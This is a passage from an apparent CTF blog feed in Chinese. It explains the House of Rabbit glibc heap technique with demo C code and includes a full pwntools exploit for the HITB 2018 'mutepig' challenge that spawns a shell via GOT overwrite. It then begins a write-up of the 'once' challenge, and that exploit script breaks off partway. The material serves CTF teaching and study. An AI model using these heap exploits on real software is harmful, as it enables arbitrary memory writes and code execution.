p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p><p><img src="/img/house_of_rabbit/1.png" alt=""></p><h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2  申请小堆块并放入fastbin"></a>步骤2  申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>此时，对应的堆结构是：</p><p><img src="/img/house_of_rabbit/2.png" alt=""></p><h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p><p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br></pre></td></tr></table></figure><p>此时，堆块状态如下：</p><p><img src="/img/house_of_rabbit/3.png" alt=""></p><h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p><p>触发代码如下：(malloc.c 4071)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0  0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应步骤代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure><p>步骤结束后，内存分布如下：</p><p><img src="/img/house_of_rabbit/4.png" alt=""></p><h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p><p>malloc检测如下（malloc.c 3473）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">           malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>步骤代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">printf(&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">gbuf[3] = 0xa00001;</span><br><span class="line">malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure><p>最终，程序的堆块布局如下：</p><p><img src="/img/house_of_rabbit/5.png" alt=""></p><h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">&quot;  target is at %p\n&quot;</span><br><span class="line">&quot;  Before : %s\n&quot;</span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure><h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018       mutepig"></a>HITB CTF 2018       mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p><p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'mutepig'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./mutepig'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.128.158'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(type,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line">p.send(content)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content1,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.send(content1)</span><br><span class="line">p.send(content2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bss_list = <span class="number">0x06020C0</span></span><br><span class="line">bss_can_be_edit = <span class="number">0x602120</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_0'</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_1'</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'p4nda_2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'p4nda_3'</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>)+<span class="string">'\0'</span>*<span class="number">15</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xA00001</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_4'</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0xfffffffffffffff0</span>)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">add(<span class="number">0x3419</span>,<span class="string">'p4nda_5'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">1</span>,p64(elf.got[<span class="string">'free'</span>])[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.symbols[<span class="string">'system'</span>])[:<span class="number">-1</span>],<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/house_of_rabbit/mutepig">题目</a></p>]]></content>
    
    <summary type="html">
    
      House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到任意地址分配的目的。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>HITB gsec CTF Qual 2018 部分PWN题解</title>
    <link href="http://p4nda.top/2018/04/17/hitb2018/"/>
    <id>http://p4nda.top/2018/04/17/hitb2018/</id>
    <published>2018-04-17T05:40:06.000Z</published>
    <updated>2018-10-03T12:47:22.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><p>此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 bin             struc ; (sizeof=0x20, mappedto_1)</span><br><span class="line">00000000 field_0         dq ?</span><br><span class="line">00000008 field_8         dd ?</span><br><span class="line">0000000C field_C         dd ?</span><br><span class="line">00000010 fd              dq ?</span><br><span class="line">00000018 bk              dq ?</span><br><span class="line">00000020 bin             ends</span><br></pre></td></tr></table></figure><p>其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">funtion1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// ST18_8@1</span></span><br><span class="line">  bin *ptr; <span class="comment">// rax@1</span></span><br><span class="line">  bin *mem; <span class="comment">// ST10_8@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx@1</span></span><br><span class="line"></span><br><span class="line">  v0 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  ptr = (bin *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  ptr-&gt;fd = <span class="number">0L</span>L;</span><br><span class="line">  ptr-&gt;bk = <span class="number">0L</span>L;</span><br><span class="line">  mem = (bin *)bss_once_mem;</span><br><span class="line">  bss_once_mem = ptr;</span><br><span class="line">  ptr-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">  ptr-&gt;bk = (__int64)mem;</span><br><span class="line">  mem-&gt;fd = (__int64)ptr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"suceess."</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write_(bss_once_mem, <span class="number">0x20</span>u);</span><br><span class="line">    bss_once_flag = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag_2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    bss_once_mem = (bin *)bss_once_mem-&gt;bk;</span><br><span class="line">    bss_once_mem-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">    bss_once_flag_2 = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。</p><p>此题中开启了全部保护，因此无法获悉其内部任何地址。</p><p>本题解题思路是：</p><p>1 根据给定的功能泄露libc地址</p><p>2 使用1功能初始链</p><p>3 利用4功能申请一个大堆块备用</p><p>4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10</p><p>5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址</p><p>6 利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位</p><p>7 将__free_hook覆写为system，释放堆块，得到shell</p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./once'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = 